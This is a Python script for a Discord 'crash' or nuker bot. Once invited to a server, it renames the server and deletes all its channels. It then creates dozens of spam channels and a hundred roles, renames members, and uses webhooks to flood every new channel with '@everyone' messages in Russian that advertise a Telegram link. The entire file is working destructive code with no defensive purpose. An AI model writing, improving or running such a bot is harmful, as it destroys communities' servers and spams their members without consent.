token = "token"
import discord
from discord.ext import commands
from discord import Permissions
import asyncio
import os
import discord, random, aiohttp, asyncio
from threading import Thread

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents )

@bot.event
async def on_guild_join(guild):
        with open('Voice.jpg', 'rb') as f:
            icon = f.read()
        await guild.edit(name="Crash By Voice Bot", icon=icon)    


        for channel in guild.channels:
                try:
                        await channel.delete(reason="Краш сервера")
                except:
                        pass

        for _ in range(50):
            await guild.create_text_channel('crash-by-forzel')

        for _ in range(100):
          await guild.create_role(name='Crash by forzel')    
        for member in guild.members:
           try:
             await member.edit(nick="Crashed By Voice Bot")
           except:
             pass

@bot.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name = "Crashed By forzel")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      for i in range(100):
        try:
          await webhook.send("@everyone\nВы крашнуты!\nhttps://t.me/protectcheck")
        except:
          break

bot.run(token)